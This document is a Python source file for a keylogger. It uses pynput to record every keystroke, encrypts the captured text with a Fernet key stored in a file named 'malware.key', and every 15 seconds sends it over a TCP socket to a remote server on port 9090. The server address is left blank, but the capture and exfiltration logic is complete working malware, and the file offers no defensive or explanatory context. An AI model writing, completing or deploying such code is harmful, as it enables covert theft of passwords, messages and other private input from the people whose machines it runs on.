from pynput.keyboard import Listener
from cryptography.fernet import Fernet
import socket
import threading
import time

SERVER = ''
PORT = 9090
listener_active = False
keystrokes = []  # In-memory storage for keystrokes

#generate a key
def generate_key():
    key = Fernet.generate_key()
    with open("malware.key", "wb") as key_file:
        key_file.write(key)

#load key
def load_key():
    return open("malware.key", "rb").read()

#for encrypting message
def encryption_message(message):
    key = load_key()
    f = Fernet(key)
    encrypted_message = f.encrypt(message.encode())
    return encrypted_message

# SOCKETS
def send_keystrokes(keystrokes_data):
    global listener_active
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER, PORT))
        start_connection = "Connection started"
        s.sendall(start_connection.encode('utf-8'))

        response = s.recv(1024)
        print(f"Server response: {response.decode('utf-8')}")
        if response.decode('utf-8') == 'restart_listener':
            listener_active = False

        # Ecrypt message before sending
        keystrokes_str = ''.join(keystrokes_data)
        encrypted_message = encryption_message(keystrokes_str)
        s.sendall(encrypted_message)
    print('Keystrokes sent Successfully')

# Keylogger key
def on_press(key):
    global keystrokes
    keystrokes.append(str(key))

# Keylogger
def keyboard_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

def start_listener():
    global listener_active, keystrokes
    listener_thread = threading.Thread(target=keyboard_listener)
    listener_thread.start()
    listener_active = True


generate_key()

while True:
    if not listener_active:
        start_listener()
        # Wait for a certain amount of time or number of keystrokes
        time.sleep(15)
        send_keystrokes(keystrokes)
        # Clear the in-memory keystrokes after sending
        keystrokes = []

